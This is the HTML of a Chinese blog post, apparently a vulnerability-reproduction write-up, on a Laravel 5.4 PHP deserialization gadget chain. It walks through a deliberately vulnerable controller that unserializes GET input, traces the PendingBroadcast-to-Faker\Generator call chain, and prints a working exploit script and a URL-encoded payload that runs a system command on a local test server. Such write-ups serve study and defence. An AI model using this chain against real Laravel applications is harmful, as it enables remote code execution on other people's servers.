@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="首先在：\routes\web.php 把配置文件换成： 1Route::get(&quot;&#x2F;&quot;,&quot;\App\Http\Controllers\POPController@test&quot;);  然后\app\Http\Controllers\POPController.php插入：（没有这个文件就自行创建） 12345678910111213&lt;?phpnamesp">
+<meta property="og:type" content="article">
+<meta property="og:title" content="laravel漏洞复现5.4">
+<meta property="og:url" content="http://example.com/2025/04/10/laravel%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B05-4/index.html">
+<meta property="og:site_name" content="juju">
+<meta property="og:description" content="首先在：\routes\web.php 把配置文件换成： 1Route::get(&quot;&#x2F;&quot;,&quot;\App\Http\Controllers\POPController@test&quot;);  然后\app\Http\Controllers\POPController.php插入：（没有这个文件就自行创建） 12345678910111213&lt;?phpnamesp">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/image/laravel%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B05-4/1744298256935-3f0bffea-a7d1-4c6d-9ac2-feaf1b1c83f9.png">
+<meta property="og:image" content="http://example.com/image/laravel%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B05-4/1744298549791-743c25f8-71f1-491f-92c0-e51ff5705e4c.png">
+<meta property="og:image" content="http://example.com/image/laravel%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B05-4/1744298914507-e527ddc8-53b7-4bb5-a358-4562dd82fef0.png">
+<meta property="article:published_time" content="2025-04-10T15:30:28.000Z">
+<meta property="article:modified_time" content="2025-04-10T15:30:41.804Z">
+<meta property="article:author" content="juju">
+<meta property="article:tag" content="漏洞复现">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/image/laravel%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B05-4/1744298256935-3f0bffea-a7d1-4c6d-9ac2-feaf1b1c83f9.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/head.jpg" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/head.jpg">
+        
+      
+    
+    <!-- title -->
+    <title>laravel漏洞复现5.4</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2025/04/10/laravel%E6%9C%AC%E5%9C%B0%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/04/10/laravel%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B05-4/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/04/10/laravel%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B05-4/&text=laravel漏洞复现5.4"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/04/10/laravel%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B05-4/&title=laravel漏洞复现5.4"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/04/10/laravel%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B05-4/&is_video=false&description=laravel漏洞复现5.4"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=laravel漏洞复现5.4&body=Check out this article: http://example.com/2025/04/10/laravel%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B05-4/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/04/10/laravel%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B05-4/&title=laravel漏洞复现5.4"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/04/10/laravel%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B05-4/&title=laravel漏洞复现5.4"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/04/10/laravel%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B05-4/&title=laravel漏洞复现5.4"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/04/10/laravel%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B05-4/&title=laravel漏洞复现5.4"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/04/10/laravel%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B05-4/&name=laravel漏洞复现5.4&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/04/10/laravel%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B05-4/&t=laravel漏洞复现5.4"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        laravel漏洞复现5.4
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">juju</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-04-10T15:30:28.000Z" class="dt-published" itemprop="datePublished">2025-04-10</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">漏洞复现</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>首先在：\routes\web.php 把配置文件换成：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Route::get(&quot;/&quot;,&quot;\App\Http\Controllers\POPController@test&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>然后\app\Http\Controllers\POPController.php插入：（没有这个文件就自行创建）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace App\Http\Controllers;</span><br><span class="line"></span><br><span class="line">class POPController extends Controller&#123;</span><br><span class="line">    public function test()&#123;</span><br><span class="line">        if(isset($_GET[&#x27;test&#x27;]))&#123;</span><br><span class="line">            unserialize($_GET[&#x27;test&#x27;]);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            echo &quot;Welcome!&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>接下来就是代码审计：首先反序列化，就找到与之相关的魔术方法： __destruct() 和 __wakeup()</p>
+<p>这里找的是 __destruct()，最后锁定的就是：PendingBroadcast.php</p>
+<p><img src="/../image/laravel%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B05-4/1744298256935-3f0bffea-a7d1-4c6d-9ac2-feaf1b1c83f9.png" alt="img"></p>
+<p>跟进去，发现最后调用了一个 dispatch 函数，这里可以调用一个不存在的函数，触发__call() 魔术方法。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function __destruct()</span><br><span class="line">&#123;</span><br><span class="line">    $this-&gt;events-&gt;dispatch($this-&gt;event);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后全局搜索 __call()魔术方法，这有个技巧就是，最好搜索 __call(       因为我搜索__call找不到要寻找的类。</p>
+<p><img src="/../image/laravel%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B05-4/1744298549791-743c25f8-71f1-491f-92c0-e51ff5705e4c.png" alt="img"></p>
+<p>最后锁定Faker\Generator.php</p>
+<p>跟进：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public function __call($method, $attributes)</span><br><span class="line">&#123;</span><br><span class="line">    return $this-&gt;format($method, $attributes);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>然后再跟进 format</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function format($formatter, $arguments = array())</span><br><span class="line">&#123;</span><br><span class="line">    return call_user_func_array($this-&gt;getFormatter($formatter), $arguments);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后跟进getFormatter：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">public function getFormatter($formatter)</span><br><span class="line">&#123;</span><br><span class="line">    if (isset($this-&gt;formatters[$formatter])) &#123;</span><br><span class="line">        return $this-&gt;formatters[$formatter];</span><br><span class="line">    &#125;</span><br><span class="line">    foreach ($this-&gt;providers as $provider) &#123;</span><br><span class="line">        if (method_exists($provider, $formatter)) &#123;</span><br><span class="line">            $this-&gt;formatters[$formatter] = array($provider, $formatter);</span><br><span class="line"></span><br><span class="line">            return $this-&gt;formatters[$formatter];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    throw new \InvalidArgumentException(sprintf(&#x27;Unknown formatter &quot;%s&quot;&#x27;, $formatter));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以发现$this-&gt;formatters[$formatter] 我们可以控制。</p>
+<p>exp:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace Illuminate\Broadcasting&#123;</span><br><span class="line">    class PendingBroadcast&#123;</span><br><span class="line">        public function __construct($events, $event)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;event = $event;</span><br><span class="line">            $this-&gt;events = $events;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace Faker&#123;</span><br><span class="line">    class Generator&#123;</span><br><span class="line">        protected $formatters = array();</span><br><span class="line">        public function __construct($fun)</span><br><span class="line">        &#123;</span><br><span class="line">            $this -&gt; formatters = [&quot;dispatch&quot; =&gt; $fun];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace &#123;</span><br><span class="line">    $a = new Faker\Generator(&quot;system&quot;);</span><br><span class="line">    $b = new Illuminate\Broadcasting\PendingBroadcast($a,&quot;dir&quot;);</span><br><span class="line">    echo urlencode(serialize($b));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:888/?test=O%3A40%3A%22Illuminate%5CBroadcasting%5CPendingBroadcast%22%3A2%3A%7Bs%3A5%3A%22event%22%3Bs%3A6%3A%22whoami%22%3Bs%3A6%3A%22events%22%3BO%3A15%3A%22Faker%5CGenerator%22%3A1%3A%7Bs%3A13%3A%22%00%2A%00formatters%22%3Ba%3A1%3A%7Bs%3A8%3A%22dispatch%22%3Bs%3A6%3A%22system%22%3B%7D%7D%7DPHP</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/../image/laravel%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B05-4/1744298914507-e527ddc8-53b7-4bb5-a358-4562dd82fef0.png" alt="img"></p>
+
+  </div>
+</article>
+
+    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+    <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+    <div id="vcomments" class="blog-post-comments"></div>
+    <script>
+        new Valine({
+            el: '#vcomments',
+            visitor: true,
+            appId: '0cD8XYS5aRoaPXBQ2dkwSoOI-gzGzoHsz',
+            appKey: 'UD7mUoaxqx0jyMaDNVNDgTpN',
+            placeholder: 'ヾﾉ≧∀≦)o来啊，快活啊!',
+            avatar: 'robohash'
+        })
+    </script>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/tags/">标签</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/04/10/laravel%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B05-4/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/04/10/laravel%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B05-4/&text=laravel漏洞复现5.4"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/04/10/laravel%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B05-4/&title=laravel漏洞复现5.4"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/04/10/laravel%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B05-4/&is_video=false&description=laravel漏洞复现5.4"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=laravel漏洞复现5.4&body=Check out this article: http://example.com/2025/04/10/laravel%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B05-4/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/04/10/laravel%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B05-4/&title=laravel漏洞复现5.4"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/04/10/laravel%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B05-4/&title=laravel漏洞复现5.4"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/04/10/laravel%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B05-4/&title=laravel漏洞复现5.4"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/04/10/laravel%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B05-4/&title=laravel漏洞复现5.4"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/04/10/laravel%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B05-4/&name=laravel漏洞复现5.4&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/04/10/laravel%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B05-4/&t=laravel漏洞复现5.4"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2025
+    juju
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
